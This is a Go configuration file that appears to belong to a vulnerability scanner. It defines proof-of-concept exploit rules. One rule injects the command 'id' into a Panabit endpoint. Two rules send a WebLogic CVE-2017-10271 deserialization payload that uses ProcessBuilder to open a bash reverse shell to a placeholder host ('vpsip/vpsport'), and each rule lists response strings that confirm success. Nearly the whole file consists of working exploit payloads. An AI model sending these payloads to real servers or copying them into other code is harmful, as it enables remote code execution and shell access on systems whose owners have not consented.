package config

type Instr struct {
	ContainStr string
}

type PocRule struct {
	Rank      string
	Name      string
	Method    string
	Path      string
	Header    map[string]string
	Body      string
	StrVerity Instr
}

var PocRules = []PocRule{
	{"1", "Panabit RCE", "POST", "/account/sy_addmount.php", nil, "username=|id", Instr{"uid"}},
	{
		"1",
		"CVE-2017-10271",
		"POST",
		"/wls-wsat/CoordinatorPortType",
		map[string]string{
			"Content-Type": "text/xml;charset=UTF-8", "User-Agent": "TestUA/1.0",
		},
		`<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/vpsip/vpsport 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>`,
		Instr{
			ContainStr: "<faultstring>java.lang.ProcessBuilder",
		}},
	{
		"1",
		"CVE-2017-10271",
		"POST",
		"/wls-wsat/CoordinatorPortType",
		map[string]string{
			"Content-Type": "text/xml;charset=UTF-8", "User-Agent": "TestUA/1.0",
		},
		`<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/vpsip/vpsport 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>`,
		Instr{
			ContainStr: "java.util.NoSuchElementException",
		}},
}
